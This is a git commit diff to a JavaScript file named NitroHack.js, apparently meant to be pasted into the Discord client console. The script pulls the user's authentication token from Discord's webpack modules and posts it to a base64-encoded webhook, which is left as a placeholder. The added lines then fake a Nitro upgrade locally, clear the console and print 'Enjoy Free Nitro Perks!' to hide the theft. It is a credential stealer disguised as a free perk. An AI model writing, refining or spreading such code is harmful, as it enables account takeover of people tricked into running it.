46c6b5eb21b0275a2dd6eb273f995faf361cb5cd
Tung <89498812+tungdo0602@users.noreply.github.com>
2021-12-05 10:00:39 +0700

    Update NitroHack.js

--- NitroHack.js
+++ NitroHack.js
@@ -1,2 +1,6 @@
+var ntype = prompt("Nitro Type (1 = classic, 2 = boost): ")
 var nitrohacks = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return m.default.getToken()}}}])
 fetch(atob('webhook_base64encode_here'), {method: 'post', headers: {'Content-Type': 'application/json',}, body: JSON.stringify({content: nitrohacks,}),});
+window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().premiumType = ntype;}}}]);
+console.clear()
+console.log("Enjoy Free Nitro Perks!")
